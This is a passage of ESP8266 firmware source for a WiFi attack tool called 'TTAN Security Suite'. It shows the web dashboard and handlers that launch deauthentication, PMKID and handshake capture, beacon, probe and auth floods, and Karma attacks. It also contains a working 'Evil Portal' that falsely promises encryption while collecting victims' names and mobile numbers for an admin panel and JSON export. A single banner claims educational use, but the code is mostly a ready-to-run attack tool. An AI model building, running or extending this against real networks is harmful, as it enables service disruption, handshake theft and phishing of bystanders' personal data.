           "<input name='name' placeholder='Full Name' required autocomplete='off' maxlength='32'>"
           "<input name='mobile' type='tel' placeholder='Mobile Number' required autocomplete='off' maxlength='15' pattern='[0-9]{10,15}'>"
           "<button type='submit'>Connect to Network</button></form>"
           "<div class='info'>&#128274; Your information is encrypted and secure</div></div></body></html>");
    return page;
  }

  String successPage() {
    return String("<!DOCTYPE html><html><head><meta charset='UTF-8'><meta http-equiv='refresh' content='5;url=/'><style>"
           "body{font-family:Arial;background:#667eea;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}"
           ".box{background:#fff;padding:50px;border-radius:12px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,.2)}"
           "h2{color:#2ecc71;font-size:28px}p{color:#666;font-size:16px}.ck{font-size:60px;color:#2ecc71;margin-bottom:20px}"
           "</style></head><body><div class='box'><div class='ck'>&#10003;</div>"
           "<h2>Registration Successful</h2><p>Your device is now connected</p></div></body></html>");
  }

  void streamDashboard() {
    ESP8266WebServer* srv = state.server;
    srv->setContentLength(CONTENT_LENGTH_UNKNOWN);
    srv->send(200, String("text/html"), "");

    String s;
    s.reserve(512);

    s = String("<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
        "<meta charset='UTF-8'><title>TTAN Security Suite</title><style>");
    s += FPSTR(DASH_CSS);
    s += String("</style></head><body><div class='w'>");
    srv->sendContent(s);

    bool anyActive = state.deauthActive || state.pmkidActive || state.portalActive ||
                     state.snifferActive || state.handshakeActive || state.beaconFloodActive ||
                     state.probeFloodActive || state.authFloodActive || state.karmaActive;

    s  = String("<h1>&#9888; TTAN SECURITY SUITE v3.0</h1>");
    s += String("<div style='text-align:center;color:#ff0;font-size:.9em;margin-bottom:15px'>Enhanced WiFi Penetration Testing</div>");
    if (anyActive) s += String("<div class='warn'>&#9889; ATTACK IN PROGRESS</div>");
    srv->sendContent(s);

    // System status
    s  = String("<div class='b'><b>&#9881; SYSTEM STATUS</b><br>");
    s += String("<div class='st'>Clients: ") + String(WiFi.softAPgetStationNum()) + String("</div>");
    s += String("<div class='st'>Uptime: ") + Utils::formatUptime(millis() - state.startTime) + String("</div>");
    s += String("<div class='st'>Free RAM: ") + String(ESP.getFreeHeap() / 1024) + String(" KB</div>");
    s += String("<div class='st'>Requests: ") + String(state.totalRequests) + String("</div>");
    s += String("<div class='st'>Errors: ") + String(state.errorCount) + String("</div>");
    if (state.errorCount > 0)
      s += String("<div class='err'>Last: ") + Utils::htmlEncode(state.lastError) + String("</div>");
    s += String("</div>");
    srv->sendContent(s);

    // Recon
    s  = String("<div class='b'><b>&#128270; RECONNAISSANCE</b><div class='g'>");
    s += String("<a href='/s' class='btn c1'>WiFi Scan</a>");
    s += String("<a href='/h' class='btn c1'>Host Scan</a>");
    s += String("<a href='/x' class='btn c1'>Clear Logs</a>");
    s += String("<a href='/stop' class='btn c4'>Stop All</a>");
    s += String("<a href='/r' class='btn c3'>Reboot</a>");
    s += String("</div></div>");
    srv->sendContent(s);

    // Attacks
    String boxClass = anyActive ? String("b a") : String("b");
    s  = String("<div class='") + boxClass + String("'>");
    s += String("<b>&#9876; ATTACK VECTORS</b><br>");
    s += String("Channel: <select id='ch'>");
    for (int i = 1; i<=13; i++) {
      s += String("<option"); if (i == state.targetChannel) s += String(" selected");
      s += String(">") + String(i) + String("</option>");
    }
    s += String("</select> <label><input type='checkbox' id='hop'> Auto-hop</label><div class='g' style='margin-top:10px'>");
    srv->sendContent(s);

    if (state.deauthActive)
      srv->sendContent(String("<a href='/ds' class='btn c3'>&#9632; STOP Deauth</a>"));
    else
      srv->sendContent(String("<span class='btn c2 off'>Deauth (Scan)</span>"));

    if (state.pmkidActive)
      srv->sendContent(String("<a href='/ps' class='btn c3'>&#9632; STOP PMKID</a>"));
    else
      srv->sendContent(String("<a href='#' class='btn c2' onclick='startPMKID()'>&#9679; PMKID</a>"));

    if (state.handshakeActive) {
      s  = String("<a href='/hs' class='btn c3'>&#9632; STOP Handshake</a>");
      s += String("<a href='/handshake' class='btn c1' target='_blank'>View");
      if (state.handshakeCount > 0) s += String("<span class='badge'>") + String(state.handshakeCount) + String("</span>");
      s += String("</a>");
    } else {
      s = String("<a href='#' class='btn c2' onclick='startHS()'>&#9679; Handshake</a>");
    }
    srv->sendContent(s);

    if (state.portalActive) {
      s  = String("<a href='/es' class='btn c3'>&#9632; STOP Portal</a>");
      s += String("<a href='http://") + WiFi.softAPIP().toString() + String(":") + String(Config::ADMIN_PORT) + String("/admin' class='btn c2' target='_blank'>Victims");
      if (state.credentialCount > 0) s += String("<span class='badge'>") + String(state.credentialCount) + String("</span>");
      s += String("</a>");
    } else {
      s = String("<a href='#' class='btn c2' onclick='startPortal()'>&#128526; Evil Portal</a>");
    }
    srv->sendContent(s);

    if (state.snifferActive)
      srv->sendContent(String("<a href='/ns' class='btn c3'>&#9632; STOP Sniffer</a>"));
    else
      srv->sendContent(String("<a href='#' class='btn c2' onclick='startSniff()'>&#128225; Sniffer</a>"));

    if (state.beaconFloodActive)
      srv->sendContent(String("<a href='/bs' class='btn c3'>&#9632; STOP Beacon</a>"));
    else
      srv->sendContent(String("<a href='#' class='btn c2' onclick='startBeacon()'>&#128225; Beacon Flood</a>"));

    if (state.probeFloodActive)
      srv->sendContent(String("<a href='/prs' class='btn c3'>&#9632; STOP Probe</a>"));
    else
      srv->sendContent(String("<a href='#' class='btn c2' onclick='startProbe()'>&#128225; Probe Flood</a>"));

    if (state.authFloodActive)
      srv->sendContent(String("<a href='/aus' class='btn c3'>&#9632; STOP Auth</a>"));
    else
      srv->sendContent(String("<span class='btn c2 off'>Auth Flood (Scan)</span>"));

    if (state.karmaActive)
      srv->sendContent(String("<a href='/ks' class='btn c3'>&#9632; STOP Karma</a>"));
    else
      srv->sendContent(String("<a href='#' class='btn c2' onclick='startKarma()'>&#128526; Karma</a>"));

    srv->sendContent(String("</div></div>"));

    // Active status boxes
    if (state.deauthActive) {
      srv->sendContent(String("<div class='b a'><b>&#9889; DEAUTH</b><br>") + state.deauthData + String("</div>"));
    }
    if (state.pmkidActive) {
      s  = String("<div class='b a'><b>&#128272; PMKID</b><br>") + state.pmkidData;
      s += String("<br>Pkts: ") + String(state.packetCount) + String(" | EAPOL: ") + String(state.eapolCount) + String("</div>");
      srv->sendContent(s);
    }
    if (state.handshakeActive) {
      s  = String("<div class='b a'><b>&#128272; HANDSHAKE</b><br>") + state.handshakeData;
      s += String("<br>Pkts: ") + String(state.packetCount) + String(" | EAPOL: ") + String(state.eapolCount);
      s += String(" | Complete: ") + String(state.handshakeCount) + String("</div>");
      srv->sendContent(s);
    }
    if (state.portalActive) {
      s  = String("<div class='b a'><b>&#128526; PORTAL</b><br>") + state.credentialData;
      s += String("<br><b>Admin:</b> http://") + WiFi.softAPIP().toString() + String(":") + String(Config::ADMIN_PORT) + String("/admin</div>");
      srv->sendContent(s);
    }
    if (state.snifferActive) {
      srv->sendContent(String("<div class='b a'><b>&#128225; SNIFFER</b><br>CH: ") + String(state.targetChannel) +
                       String(" | Pkts: ") + String(state.packetCount) + String("</div>"));
    }
    if (state.beaconFloodActive) {
      srv->sendContent(String("<div class='b a'><b>&#128225; BEACON</b><br>") + state.beaconData +
                       String(" | Sent: ") + String(state.beaconCount) + String("</div>"));
    }
    if (state.probeFloodActive) {
      srv->sendContent(String("<div class='b a'><b>&#128225; PROBE</b><br>") + state.probeData +
                       String(" | Sent: ") + String(state.probeCount) + String("</div>"));
    }
    if (state.authFloodActive) {
      srv->sendContent(String("<div class='b a'><b>&#128225; AUTH</b><br>") + state.authData +
                       String(" | Sent: ") + String(state.authCount) + String("</div>"));
    }
    if (state.karmaActive) {
      srv->sendContent(String("<div class='b a'><b>&#128526; KARMA</b><br>") + state.karmaData +
                       String(" | Responses: ") + String(state.karmaCount) + String("</div>"));
    }

    if (state.scanData.length() > 0)
      srv->sendContent(String("<div class='b'><b>&#128270; SCAN</b><br>") + state.scanData + String("</div>"));
    if (state.hostData.length() > 0)
      srv->sendContent(String("<div class='b'><b>&#128270; HOSTS</b><br>") + state.hostData + String("</div>"));

    s  = String("</div><script>");
    s += String("function gc(){var c=document.getElementById('ch').value;var h=document.getElementById('hop').checked;return'&c='+c+(h?'&hop=1':'')}");
    s += String("function atk(m,c,s){if(confirm('Deauth '+s+'?'))location='/d?m='+m+'&c='+c+'&s='+encodeURIComponent(s)}");
    s += String("function atk2(m,c){if(confirm('Auth flood '+m+'?'))location='/au?m='+m+'&c='+c}");
    s += String("function startPMKID(){location='/p'+gc()}");
    s += String("function startHS(){location='/hsh'+gc()}");
    s += String("function startPortal(){var s=prompt('Fake SSID:','Free_WiFi');if(s)location='/e?s='+encodeURIComponent(s)}");
    s += String("function startSniff(){location='/n'+gc()}");
    s += String("function startBeacon(){var s=prompt('Beacon SSID:','FakeAP');if(s){var c=document.getElementById('ch').value;location='/b?s='+encodeURIComponent(s)+'&c='+c}}");
    s += String("function startProbe(){var s=prompt('Probe SSID:','TargetNetwork');if(s){var c=document.getElementById('ch').value;location='/pr?s='+encodeURIComponent(s)+'&c='+c}}");
    s += String("function startKarma(){var s=prompt('Karma SSID:','Free_WiFi');if(s)location='/k?s='+encodeURIComponent(s)}");
    s += String("</script></body></html>");
    srv->sendContent(s);
    srv->sendContent("");
  }

  String handshakePage() {
    String p;
    p.reserve(2000);
    p += String("<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><meta charset='UTF-8'>");
    p += String("<title>Handshake Capture</title><style>") + String(FPSTR(HS_CSS)) + String("</style></head><body><div class='w'>");
    p += String("<h1>&#128272; HANDSHAKE CAPTURE</h1>");

    if (state.handshakeActive) {
      p += String("<div class='b'><b style='color:#0f0;font-size:1.2em'>&#9889; CAPTURE ACTIVE</b><br>");
      p += String("<span style='color:#0ff'>CH: <b>") + String(state.targetChannel) + String("</b> | ");
      p += String("Pkts: <b>") + String(state.packetCount) + String("</b> | ");
      p += String("EAPOL: <b>") + String(state.eapolCount) + String("</b> | ");
      p += String("Complete: <b>") + String(state.handshakeCount) + String("</b></span></div>");
    } else {
      p += String("<div class='b' style='border-color:#666;color:#666'><b>&#11044; INACTIVE</b></div>");
    }

    p += String("<div class='cnt'>&#128202; Handshakes: ") + String(state.handshakeCount) + String("</div>");
    p += String("<div class='g'>");
    p += String("<a href='#' class='btn e1' onclick='toggleEx();return false'>Export</a>");
    p += String("<a href='/handshake/clear' class='btn e2' onclick='return confirm(\"Clear?\")'>Clear</a>");
    p += String("<a href='/dash' class='btn e3'>Dashboard</a></div>");

    p += String("<div id='ex' class='xs'><h3 style='color:#0ff'>Export:</h3><textarea id='et' readonly>");
    for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
      if (state.handshakes[i].complete) {
        p += String("HS #") + String(i+1) + String(" BSSID=") + Utils::macToStr(state.handshakes[i].bssid);
        p += String(" Frames=") + String(state.handshakes[i].frameCount) + String("\n");
      }
    }
    p += String("</textarea><button class='btn e1' style='margin-top:10px' onclick='cp()'>Copy</button></div>");

    if (state.handshakeCount > 0) {
      for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
        if (state.handshakes[i].complete) {
          p += String("<div class='hs'><b style='color:#0f0'>HS #") + String(i+1) + String("</b><br>");
          p += String("<span style='color:#0ff'>BSSID: ") + Utils::macToStr(state.handshakes[i].bssid) + String("</span><br>");
          p += String("<span style='color:#ff0'>Frames: ") + String(state.handshakes[i].frameCount) + String("</span></div>");
        }
      }
    } else {
      p += String("<div class='empty'>No handshakes captured yet.</div>");
    }

    p += String("</div><script>");
    p += String("function toggleEx(){document.getElementById('ex').classList.toggle('show')}");
    p += String("function cp(){var t=document.getElementById('et');t.select();document.execCommand('copy');alert('Copied!')}");
    p += String("</script></body></html>");
    return p;
  }
}

// ---------- Admin Handlers ----------

namespace AdminHandlers {

  void handleRoot() {
    ESP8266WebServer* srv = state.adminServer;
    srv->setContentLength(CONTENT_LENGTH_UNKNOWN);
    srv->send(200, String("text/html"), "");

    String s;
    s.reserve(400);
    s  = String("<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><meta charset='UTF-8'>");
    s += String("<title>Admin Panel</title><style>") + String(FPSTR(ADMIN_CSS)) + String("</style></head><body><div class='w'>");
    s += String("<h1>&#128272; ADMIN PANEL</h1>");
    srv->sendContent(s);

    if (state.portalActive) {
      s  = String("<div class='b'><b style='color:#f00;font-size:1.2em'>&#9889; PORTAL ACTIVE</b><br>");
      s += String("<span style='color:#0f0'>SSID: <b>") + Utils::htmlEncode(state.currentPortalSSID) + String("</b><br>");
      s += String("Victims connected: <b>") + String(WiFi.softAPgetStationNum()) + String("</b></span></div>");
    } else {
      srv->sendContent(String("<div class='b' style='border-color:#666;color:#666'><b>&#11044; PORTAL INACTIVE</b></div>"));
      s = "";
    }
    srv->sendContent(s);

    s  = String("<div class='cnt'>&#128202; Total Victims: ") + String(state.credentialCount) + String("</div>");
    s += String("<div class='g'>");
    s += String("<a href='#' class='btn e1' onclick='toggleEx();return false'>Export</a>");
    s += String("<a href='/admin/json' class='btn e1' target='_blank'>JSON</a>");
    s += String("<a href='/admin/clear' class='btn e2' onclick='return confirm(\"Clear all?\")'>Clear</a>");
    s += String("<a href='/dash' class='btn e3'>Dashboard</a></div>");
    srv->sendContent(s);

    s  = String("<div id='ex' class='xs'><h3 style='color:#0ff'>Export:</h3><textarea id='et' readonly>");
    for (int i = 0; i < state.credentialCount; i++) {
      s += Utils::htmlEncode(state.creds[i].name) + String(" : ") + Utils::htmlEncode(state.creds[i].mobile) + String("\n");
    }
    s += String("</textarea><button class='btn e1' style='margin-top:10px' onclick='cp()'>Copy</button></div>");
    srv->sendContent(s);

    if (state.credentialCount > 0) {
      for (int i = state.credentialCount - 1; i >= 0; i--) {
        s  = String("<div class='cd'><b style='color:#f00'>#") + String(state.credentialCount - i) + String("</b><br>");
        s += String("<span style='color:#0f0'>Name: ") + Utils::htmlEncode(state.creds[i].name) + String("</span><br>");
        s += String("<span style='color:#0ff'>Mobile: ") + Utils::htmlEncode(state.creds[i].mobile) + String("</span><br>");
        s += String("<span style='color:#888'>") + Utils::formatUptime(state.creds[i].timestamp) + String("</span></div>");
        srv->sendContent(s);
      }
    } else {
      srv->sendContent(String("<div class='empty'>No victims yet.</div>"));
    }

    srv->sendContent(String("</div><script>function toggleEx(){document.getElementById('ex').classList.toggle('show')}"
                     "function cp(){var t=document.getElementById('et');t.select();document.execCommand('copy');alert('Copied!')}</script></body></html>"));
    srv->sendContent("");
  }

  void handleJSON() {
    String j;
    j.reserve(512 + state.credentialCount * 80);
    j = String("{\"victims\":[");
    for (int i = 0; i < state.credentialCount; i++) {
      if (i > 0) j += ',';
      j += String("{\"id\":") + String(i+1) + String(",");
      j += String("\"name\":\"") + Utils::jsonEncode(state.creds[i].name) + String("\",");
      j += String("\"mobile\":\"") + Utils::jsonEncode(state.creds[i].mobile) + String("\",");
      j += String("\"time\":\"") + Utils::formatUptime(state.creds[i].timestamp) + String("\"}");
    }
    j += String("],\"total\":") + String(state.credentialCount);
    j += String(",\"portal_active\":") + String(state.portalActive ? "true" : "false");
    j += String(",\"ssid\":\"") + Utils::jsonEncode(state.currentPortalSSID) + String("\"");
    j += String(",\"uptime\":\"") + Utils::formatUptime(millis() - state.startTime) + String("\"");
    j += String(",\"heap\":") + String(ESP.getFreeHeap());
    j += '}';
    state.adminServer->send(200, String("application/json"), j);
  }

  void handleClear() {
    state.credentialCount = 0;
    for (int i = 0; i < Config::MAX_CREDENTIALS; i++) state.creds[i] = Credential();
    state.adminServer->sendHeader(String("Location"), String("/admin"));
    state.adminServer->send(302);
  }

  void handleNotFound() {
    state.adminServer->sendHeader(String("Location"), String("/admin"));
    state.adminServer->send(302);
  }
}

// ---------- Handlers ----------

namespace Handlers {

  void handleRoot() {
    if (state.portalActive) {
      state.server->send(200, String("text/html"), HTML::captivePortal());
      return;
    }
    state.totalRequests++;
    HTML::streamDashboard();
  }

  void handleDash() {
    state.totalRequests++;
    HTML::streamDashboard();
  }

  void handleScan() {
    state.scanData = String("<table><tr><th>SSID</th><th>Signal</th><th>CH</th><th>Sec</th><th>BSSID</th><th>Action</th></tr>");
    WiFi.mode(WIFI_AP_STA);
    int n = WiFi.scanNetworks(false, false);
    if (n > 0) {
      for (int i = 0; i < n && i < Config::MAX_SCAN_RESULTS; i++) {
        String ssid = WiFi.SSID(i);
        if (ssid.length() == 0) ssid = String("[Hidden]");
        ssid = Utils::sanitizeAlphaNum(ssid);
        String enc   = Utils::encStr(WiFi.encryptionType(i));
        String bssid = WiFi.BSSIDstr(i);
        int ch  = WiFi.channel(i);
        int rs  = WiFi.RSSI(i);
        String sig = String(rs) + String(" dBm");
        if (rs > -50) sig += String(" &#9733;");
        else if (rs > -70) sig += String(" &#9734;");

        state.scanData += String("<tr><td>") + Utils::htmlEncode(ssid) + String("</td>");
        state.scanData += String("<td>") + sig + String("</td>");
        state.scanData += String("<td>") + String(ch) + String("</td>");
        state.scanData += String("<td>") + enc + String("</td>");
        state.scanData += String("<td style='font-size:.75em'>") + bssid + String("</td>");
        state.scanData += String("<td><button class='mn' onclick='atk(\"") + bssid + String("\",") + String(ch) + String(",\"") +
                          Utils::htmlEncode(ssid) + String("\")'>DEAUTH</button>");
        state.scanData += String("<button class='mn' onclick='atk2(\"") + bssid + String("\",") + String(ch) + String(")'>AUTH</button></td></tr>");
        Utils::feedWdt();
      }
      state.scanData += String("</table><div style='margin-top:10px;color:#0ff'>Found ") + String(n) + String(" network(s)</div>");
    } else {
      state.scanData += String("<tr><td colspan='6' style='text-align:center'>No networks</td></tr></table>");
    }
    WiFi.scanDelete();
    WiFi.mode(WIFI_AP);
    state.server->sendHeader(String("Location"), String("/dash"));
    state.server->send(302);
  }

  void handleHosts() {
    IPAddress lip = WiFi.softAPIP();
    state.hostData = String("<table><tr><th>IP</th><th>Status</th><th>RTT</th></tr>");
    int found = 0;
    for (int i = 2; i < 30; i++) {
      IPAddress tip(lip[0], lip[1], lip[2], i);
      WiFiClient c;
      c.setTimeout(100);
      unsigned long t0 = millis();
      if (c.connect(tip, 80)) {
        state.hostData += String("<tr><td>") + tip.toString() + String("</td>");
        state.hostData += String("<td style='color:#0f0'>&#9679; UP</td>");
        state.hostData += String("<td>") + String(millis() - t0) + String(" ms</td></tr>");
        found++;
        c.stop();
      }
      Utils::feedWdt();
      yield();
    }
    if (found == 0)
      state.hostData += String("<tr><td colspan='3' style='text-align:center'>No hosts</td></tr>");
    state.hostData += String("</table><div style='margin-top:10px;color:#0ff'>") + String(found) + String(" host(s)</div>");
    state.server->sendHeader(String("Location"), String("/dash"));
    state.server->send(302);
  }

  void handleDeauthStart() {
    String mac = state.server->arg("m");
    String ssid = state.server->arg("s");
    int ch = state.server->arg("c").toInt();
    if (mac.length() == 0) { state.server->send(400, String("text/plain"), String("Missing MAC")); return; }
    if (Attacks::startDeauth(mac, ch, ssid)) {
      state.server->sendHeader(String("Location"), String("/dash"));
      state.server->send(302);
    } else {
      state.server->send(400, String("text/plain"), String("Deauth failed"));
    }
  }

  void handleDeauthStop()    { Attacks::stopDeauth();      state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
  void handlePMKIDStop()     { Attacks::stopPMKID();       state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
  void handleHSStop()        { Attacks::stopHandshake();   state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
  void handlePortalStop()    { Attacks::stopPortal();      state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
  void handleSnifferStop()   { Attacks::stopSniffer();     state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
  void handleBeaconStop()    { Attacks::stopBeaconFlood(); state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
  void handleProbeStop()     { Attacks::stopProbeFlood();  state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
  void handleAuthStop()      { Attacks::stopAuthFlood();   state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
  void handleKarmaStop()     { Attacks::stopKarma();       state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }
  void handleStopAll()       { Attacks::stopAll();         state.server->sendHeader(String("Location"),String("/dash")); state.server->send(302); }

  void handlePMKIDStart() {
    int ch = state.server->arg("c").toInt();
    if (ch == 0) ch = 1;
    state.channelHop = state.server->hasArg("hop");
    Attacks::startPMKID(ch);
    state.server->sendHeader(String("Location"), String("/dash"));
    state.server->send(302);
  }

  void handleHSStart() {
    int ch = state.server->arg("c").toInt();
    if (ch == 0) ch = 1;
    state.channelHop = state.server->hasArg("hop");
    Attacks::startHandshake(ch);
    state.server->sendHeader(String("Location"), String("/dash"));
    state.server->send(302);
  }

  void handleHSPage() {
    state.server->send(200, String("text/html"), HTML::handshakePage());
  }

  void handleHSClear() {
    for (int i = 0; i < Config::MAX_HANDSHAKES; i++) state.handshakes[i] = HandshakeData();
    state.handshakeCount = 0;
    state.server->sendHeader(String("Location"), String("/handshake"));
    state.server->send(302);
  }

  void handlePortalStart() {
    String ssid = state.server->arg("s");
    if (ssid.length() == 0) ssid = String("Free_WiFi");
    if (Attacks::startPortal(ssid)) {
      state.server->sendHeader(String("Location"), String("/dash"));
      state.server->send(302);
    } else {
      state.server->send(500, String("text/plain"), String("Portal failed"));
    }
  }

  void handleSnifferStart() {
    int ch = state.server->arg("c").toInt();
    if (ch == 0) ch = 1;
    state.channelHop = state.server->hasArg("hop");
    Attacks::startSniffer(ch);
    state.server->sendHeader(String("Location"), String("/dash"));
    state.server->send(302);
  }

  void handleBeaconStart() {
    String ssid = state.server->arg("s");
    int ch = state.server->arg("c").toInt();
    if (ch == 0) ch = 1;
    if (ssid.length() == 0) ssid = String("FakeAP");
    Attacks::startBeaconFlood(ch, ssid);
    state.server->sendHeader(String("Location"), String("/dash"));
    state.server->send(302);
  }

  void handleProbeStart() {
    String ssid = state.server->arg("s");
    int ch = state.server->arg("c").toInt();
    if (ch == 0) ch = 1;
    if (ssid.length() == 0) ssid = String("TargetNetwork");
    Attacks::startProbeFlood(ch, ssid);
    state.server->sendHeader(String("Location"), String("/dash"));
    state.server->send(302);
  }

  void handleAuthStart() {
    String mac = state.server->arg("m");
    int ch = state.server->arg("c").toInt();
    if (mac.length() == 0) { state.server->send(400, String("text/plain"), String("Missing MAC")); return; }
    if (Attacks::startAuthFlood(mac, ch)) {
      state.server->sendHeader(String("Location"), String("/dash"));
      state.server->send(302);
    } else {
      state.server->send(400, String("text/plain"), String("Auth flood failed"));
    }
  }

  void handleKarmaStart() {
    String ssid = state.server->arg("s");
    if (ssid.length() == 0) ssid = String("Free_WiFi");
    if (Attacks::startKarma(ssid)) {
      state.server->sendHeader(String("Location"), String("/dash"));
      state.server->send(302);
    } else {
      state.server->send(500, String("text/plain"), String("Karma failed"));
    }
  }

  void handleSubmit() {
    String name   = Utils::sanitizeAlphaNum(state.server->arg("name"));
    String mobile = Utils::sanitizeAlphaNum(state.server->arg("mobile"));
    if (name.length() == 0 || mobile.length() == 0) {
      state.server->send(400, String("text/plain"), String("Invalid input"));
      return;
    }
    if (state.credentialCount < Config::MAX_CREDENTIALS) {
      state.creds[state.credentialCount].name      = name;
      state.creds[state.credentialCount].mobile    = mobile;
      state.creds[state.credentialCount].timestamp = millis();
      state.credentialCount++;
      Serial.println(String("VICTIM: ") + name + String(" : ") + mobile);
      state.credentialData = String("Active - Captured: ") + String(state.credentialCount);
    } else {
      Serial.println(F("WARNING: Victim storage full"));
    }
    state.server->send(200, String("text/html"), HTML::successPage());
  }

  void handleClear() {
    state.scanData      = String("Click WiFi Scan");
    state.hostData      = String("Click Host Scan");
    state.deauthData    = String("Select target");
    state.pmkidData     = String("Start PMKID");
    state.handshakeData = String("Start Handshake");
    state.credentialData= String("Start Portal");
    state.beaconData    = String("Start Beacon");
    state.probeData     = String("Start Probe");
    state.authData      = String("Select target");
    state.karmaData     = String("Start Karma");
    state.deauthCount   = 0;
    state.packetCount   = 0;
    state.eapolCount    = 0;
    state.handshakeCount= 0;
    state.beaconCount   = 0;
    state.probeCount    = 0;
    state.authCount     = 0;
    state.karmaCount    = 0;
    state.totalRequests = 0;
    state.errorCount    = 0;
    state.lastError     = "";
    state.startTime     = millis();
    state.server->sendHeader(String("Location"), String("/dash"));
    state.server->send(302);
  }

  void handleReboot() {
    String h = String("<!DOCTYPE html><html><head><meta charset='UTF-8'><style>"
             "body{background:#c0392b;color:#fff;text-align:center;padding:50px;font-family:Arial;margin:0}"
             "h1{font-size:2.5em}.sp{border:8px solid #f3f3f3;border-top:8px solid #fff;border-radius:50%;"
             "width:60px;height:60px;animation:spin 1s linear infinite;margin:30px auto}"
             "@keyframes spin{to{transform:rotate(360deg)}}p{font-size:16px;margin-top:20px}"
             "</style></head><body><h1>&#128260; Rebooting</h1><div class='sp'></div>"
             "<p>Reconnecting in 3 seconds...</p></body></html>");
    state.server->send(200, String("text/html"), h);
    delay(1000);
    ESP.restart();
  }

  void handleNotFound() {
    if (state.portalActive) {
      state.server->sendHeader(String("Location"), String("/"));
      state.server->send(302);
    } else {
      state.server->send(404, String("text/plain"), String("404"));
    }
  }
}

// ---------- Setup ----------

void setup() {
  Serial.begin(115200);
  delay(100);
  pinMode(Config::LED_PIN, OUTPUT);
  digitalWrite(Config::LED_PIN, HIGH);

  Serial.println(F("\n============================================================"));
  Serial.println(F("  TTAN SECURITY SUITE v3.0 - ENHANCED"));
  Serial.println(F("  Educational & Authorized Testing Only"));
  Serial.println(F("============================================================\n"));

  state.startTime = millis();

  WiFi.mode(WIFI_AP);
  WiFi.softAP(Config::AP_SSID, Config::AP_PASSWORD);
  delay(100);

  IPAddress ip = WiFi.softAPIP();
  Serial.println(String("AP Started | SSID: ") + String(Config::AP_SSID) + String(" | IP: ") + ip.toString());

  state.server      = new ESP8266WebServer(Config::WEB_PORT);
  state.adminServer = new ESP8266WebServer(Config::ADMIN_PORT);
  state.dnsServer   = new DNSServer();

  if (!state.server || !state.adminServer || !state.dnsServer) {
    Serial.println(F("FATAL: memory allocation failed"));
    delay(3000);
    ESP.restart();
  }

  // Init status strings
  state.scanData      = String("Click WiFi Scan");
  state.hostData      = String("Click Host Scan");
  state.deauthData    = String("Select target");
  state.pmkidData     = String("Start PMKID");
  state.handshakeData = String("Start Handshake");
  state.credentialData= String("Start Portal");
  state.beaconData    = String("Start Beacon");
  state.probeData     = String("Start Probe");
  state.authData      = String("Select target");
  state.karmaData     = String("Start Karma");

  state.server->on("/",               HTTP_ANY,  Handlers::handleRoot);
  state.server->on("/dash",           HTTP_ANY,  Handlers::handleDash);
  state.server->on("/s",              Handlers::handleScan);
  state.server->on("/h",              Handlers::handleHosts);
  state.server->on("/d",              Handlers::handleDeauthStart);
  state.server->on("/ds",             Handlers::handleDeauthStop);
  state.server->on("/p",              Handlers::handlePMKIDStart);
  state.server->on("/ps",             Handlers::handlePMKIDStop);
  state.server->on("/hsh",            Handlers::handleHSStart);
  state.server->on("/hs",             Handlers::handleHSStop);
  state.server->on("/handshake",      Handlers::handleHSPage);
  state.server->on("/handshake/clear",Handlers::handleHSClear);
  state.server->on("/e",              Handlers::handlePortalStart);
  state.server->on("/es",             Handlers::handlePortalStop);
  state.server->on("/n",              Handlers::handleSnifferStart);
  state.server->on("/ns",             Handlers::handleSnifferStop);
  state.server->on("/b",              Handlers::handleBeaconStart);
  state.server->on("/bs",             Handlers::handleBeaconStop);
  state.server->on("/pr",             Handlers::handleProbeStart);
  state.server->on("/prs",            Handlers::handleProbeStop);
  state.server->on("/au",             Handlers::handleAuthStart);
  state.server->on("/aus",            Handlers::handleAuthStop);
  state.server->on("/k",              Handlers::handleKarmaStart);
  state.server->on("/ks",             Handlers::handleKarmaStop);
  state.server->on("/x",              Handlers::handleClear);
  state.server->on("/stop",           Handlers::handleStopAll);
  state.server->on("/r",              Handlers::handleReboot);
  state.server->on("/submit",         HTTP_POST, Handlers::handleSubmit);
  state.server->onNotFound(Handlers::handleNotFound);

  state.adminServer->on("/",           AdminHandlers::handleRoot);
  state.adminServer->on("/admin",      AdminHandlers::handleRoot);
  state.adminServer->on("/admin/json", AdminHandlers::handleJSON);
  state.adminServer->on("/admin/clear",AdminHandlers::handleClear);
  state.adminServer->onNotFound(AdminHandlers::handleNotFound);

  state.server->begin();
  state.adminServer->begin();

  Serial.println(String("Web:   http://") + ip.toString());
  Serial.println(String("Admin: http://") + ip.toString() + ':' + String(Config::ADMIN_PORT) + String("/admin"));
  Serial.println(String("HS:    http://") + ip.toString() + String("/handshake"));
  Serial.println(F("\nReady.\n"));
}

// ---------- Loop ----------

void loop() {
  state.packetCount = v_packetCount;
  state.eapolCount  = v_eapolCount;

  processEapol();
  processKarmaQueue();

  if (state.server)      state.server->handleClient();
  if (state.adminServer) state.adminServer->handleClient();
  if (state.dnsActive && state.dnsServer) state.dnsServer->processNextRequest();

  unsigned long now = millis();

  if (state.deauthActive && now - state.lastDeauth >= Config::DEAUTH_INTERVAL) {
    Attacks::sendDeauth();
    state.lastDeauth = now;
  }
  if (state.beaconFloodActive && now - state.lastBeacon >= Config::BEACON_INTERVAL) {
    Attacks::sendBeacon();
    state.lastBeacon = now;
  }
  if (state.probeFloodActive && now - state.lastProbe >= Config::PROBE_INTERVAL) {
    Attacks::sendProbe();
    state.lastProbe = now;
  }
  if (state.authFloodActive && now - state.lastAuth >= Config::AUTH_INTERVAL) {
    Attacks::sendAuth();
    state.lastAuth = now;
  }

  if (state.channelHop && (state.pmkidActive || state.handshakeActive || state.snifferActive) &&
      now - state.lastChannelHop >= Config::CHANNEL_HOP_INTERVAL) {
    state.targetChannel = (state.targetChannel % 13) + 1;
    wifi_set_channel(state.targetChannel);
